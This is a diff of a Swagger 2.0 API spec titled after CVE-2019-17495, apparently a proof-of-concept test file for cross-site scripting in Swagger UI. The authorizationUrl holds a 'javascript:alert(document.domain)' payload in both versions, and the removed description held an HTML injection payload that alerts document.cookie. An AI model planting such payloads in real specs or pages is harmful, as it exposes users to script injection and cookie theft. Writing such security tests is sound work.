@@ -1,20 +1,19 @@
-swagger: '2.0'
-  securityDefinitions:
-    a:
-      type: oauth2
-      authorizationUrl: javascript:alert(document.domain)//
-      flow: implicit
-      scopes: {}
-  info:
-    version: "1.0.0"
-    title: XSS Test - CVE-2019-17495
-    description: |
-      <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-  paths:
-    /:
-      get:
-        security:
-          - a: []
-        responses:
-          200:
-            description: OK
+swagger: "2.0"
+info:
+  title: CVE-2019-17495
+  version: "1.0"
+securityDefinitions:
+  oauth2:
+    type: oauth2
+    authorizationUrl: "javascript:alert(document.domain)//"
+    flow: implicit
+    scopes:
+      read: read
+paths:
+  /:
+    get:
+      security:
+        - oauth2: [read]
+      responses:
+        200:
+          description: ok
